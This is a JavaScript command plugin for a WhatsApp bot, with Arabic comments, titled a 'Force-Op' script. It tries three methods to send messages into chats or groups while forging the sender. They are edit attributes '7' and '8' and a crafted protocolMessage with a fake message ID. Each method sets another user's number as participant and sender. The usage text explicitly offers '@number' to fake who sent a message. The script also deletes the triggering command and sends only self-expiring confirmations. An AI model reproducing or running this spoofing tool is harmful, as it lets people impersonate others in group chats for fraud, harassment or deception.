// =============================================
// 📌 سكربت Force-Op المتطور (3 طرق)
// =============================================

const isOwner = (userId, bot) => {
    if (!userId || !bot?.config?.owners) return false;
    const clean = userId.split(':')[0].split('@')[0];
    return bot.config.owners.some(o => {
        const oc = (o.jid || o.lid || '').split(':')[0].split('@')[0];
        return oc === clean;
    });
};

// =============================================
// 📌 الطريقة الأولى: edit: '7' (الأصلية)
// =============================================

const forceSendMethod1 = async (conn, chatId, text, targetJid = null) => {
    const contextInfo = {
        isForwarded: true,
        forwardingScore: 9999,
        ...(targetJid ? { participant: targetJid, sender: targetJid } : {})
    };

    return await conn.sendMessage(chatId, {
        text: text,
        contextInfo: contextInfo,
        additionalAttributes: { edit: '7' }
    }, {
        additionalAttributes: { edit: '7' },
        ...(targetJid ? { participant: targetJid, fromMe: false } : {})
    });
};

// =============================================
// 📌 الطريقة الثانية: edit: '8' (بديلة)
// =============================================

const forceSendMethod2 = async (conn, chatId, text, targetJid = null) => {
    const contextInfo = {
        isForwarded: true,
        forwardingScore: 9999,
        ...(targetJid ? { participant: targetJid, sender: targetJid } : {})
    };

    return await conn.sendMessage(chatId, {
        text: text,
        contextInfo: contextInfo,
        additionalAttributes: { edit: '8' }
    }, {
        additionalAttributes: { edit: '8' },
        ...(targetJid ? { participant: targetJid, fromMe: false } : {})
    });
};

// =============================================
// 📌 الطريقة الثالثة: relayMessage مع protocolMessage
// =============================================

const forceSendMethod3 = async (conn, chatId, text, targetJid = null) => {
    const fakeId = 'FO' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const cleanTarget = targetJid || conn.user.id.split(':')[0] + '@s.whatsapp.net';

    const payload = {
        protocolMessage: {
            key: {
                remoteJid: chatId,
                fromMe: false,
                id: fakeId,
                participant: cleanTarget
            },
            type: 14,
            placeholderResendMessage: {
                key: {
                    remoteJid: chatId,
                    fromMe: false,
                    id: fakeId,
                    participant: cleanTarget
                },
                message: {
                    extendedTextMessage: {
                        text: text,
                        contextInfo: {
                            participant: cleanTarget,
                            sender: cleanTarget,
                            isForwarded: true,
                            forwardingScore: 9999
                        }
                    }
                }
            },
            messageTimestamp: Math.floor(Date.now() / 1000)
        }
    };

    return await conn.relayMessage(chatId, payload, {
        participant: cleanTarget,
        fromMe: false,
        messageId: fakeId
    });
};

// =============================================
// 📌 الطريقة الرابعة: تجربة كل الطرق دفعة واحدة
// =============================================

const forceSendAll = async (conn, chatId, text, targetJid = null) => {
    const methods = [
        { name: 'edit:7', fn: forceSendMethod1 },
        { name: 'edit:8', fn: forceSendMethod2 },
        { name: 'protocol', fn: forceSendMethod3 }
    ];

    const results = [];
    for (const method of methods) {
        try {
            const result = await method.fn(conn, chatId, text, targetJid);
            results.push({ method: method.name, success: true, result });
            return { success: true, method: method.name, result };
        } catch (e) {
            results.push({ method: method.name, success: false, error: e.message });
        }
    }

    return { success: false, errors: results };
};

// =============================================
// 📌 معالج الأمر الرئيسي
// =============================================

const handler = async (m, { conn, text, bot }) => {
    // التحقق من الصلاحيات
    const senderClean = m.sender.split(':')[0].split('@')[0];
    const isOwnerUser = bot.config?.owners?.some(o => {
        const oc = (o.jid || o.lid || '').split(':')[0].split('@')[0];
        return oc === senderClean;
    });
    if (!m.isOwner && !isOwnerUser) {
        return m.reply('❌ *خاص بالمالك فقط*');
    }

    if (!text) {
        return m.reply(`⚠️ *الاستخدام:*\n.ق النص\n.ق @رقم النص (لتزييف المرسل)\n.ق ID@g.us النص (لتحديد مجموعة)`);
    }

    // استخراج المعرف والنص
    let targetChat = m.chat;
    let targetJid = null;
    let messageText = text;

    // إذا كان هناك ID مجموعة في النص
    const words = text.split(' ');
    if (words[0].includes('@g.us')) {
        targetChat = words[0];
        messageText = words.slice(1).join(' ');
    }

    // إذا كان هناك منشن (تزييف المرسل)
    const mentionMatch = messageText.match(/@(\d+)/);
    if (mentionMatch) {
        targetJid = mentionMatch[1] + '@s.whatsapp.net';
        messageText = messageText.replace(/@\d+/, '').trim();
    }

    // إذا كان هناك رد على رسالة
    if (m.quoted && m.quoted.key?.remoteJid?.includes('@g.us')) {
        targetChat = m.quoted.key.remoteJid;
        if (!messageText) {
            messageText = m.quoted.text || ' ';
        }
        // أخذ مرسل الرسالة المقتبسة لتزييفه
        if (!targetJid) {
            targetJid = m.quoted.sender || m.quoted.participant;
        }
    }

    if (!messageText) {
        return m.reply('⚠️ *اكتب النص*');
    }

    await conn.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
    m.reply(`⏳ محاولة الإرسال إلى:\n${targetChat}\n${targetJid ? '🔄 تزييف: ' + targetJid : ''}`);

    try {
        // محاولة جميع الطرق
        const result = await forceSendAll(conn, targetChat, messageText, targetJid);

        // حذف رسالة الأمر
        await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});

        if (result.success) {
            await conn.sendMessage(m.chat, {
                text: `✅ *تم الإرسال بنجاح*\n📌 الطريقة: ${result.method}\n📌 المجموعة: ${targetChat}\n${targetJid ? '🎭 تزييف: ' + targetJid : ''}`,
                ephemeralExpiration: 10
            });
        } else {
            const errors = result.errors.map(e => `${e.method}: ${e.error}`).join('\n');
            await conn.sendMessage(m.chat, {
                text: `❌ *فشلت جميع الطرق*\n\n${errors}`,
                ephemeralExpiration: 15
            });
        }

    } catch (e) {
        console.error(e);
        await m.reply(`❌ *خطأ:* ${e.message}`);
    }
};

// =============================================
// 📌 إعدادات الأمر
// =============================================

handler.command = ['ق', 'force', 'اقتحام'];
handler.owner = true;
handler.group = false;

export default handler;